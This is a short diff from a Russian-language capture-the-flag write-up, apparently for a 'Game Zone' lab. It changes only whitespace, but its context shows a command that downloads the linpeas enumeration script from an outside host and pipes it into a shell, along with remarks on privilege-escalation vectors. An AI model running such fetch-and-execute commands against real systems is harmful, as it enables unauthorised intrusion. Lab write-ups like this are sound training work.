@@ -181,7 +181,7 @@ agent47@gamezone:~$ which sh
 agent47@gamezone:~$ curl 10.21.104.16:8888/linpeas.sh | sh
 ```
 
-В задании говорилось, что можем посмотреть iptables rules, но linpeas говорит, что не можем посмотреть настройки файервола и iptables
+В задании говорилось, что можем посмотреть iptables rules, но linpeas говорит, что не можем посмотреть настройки файервола и iptables  
 ![linpeas](screenshots/01.linpeas.png)
 
 В целом, есть много других векторов, помимо предложенных в задании, например:
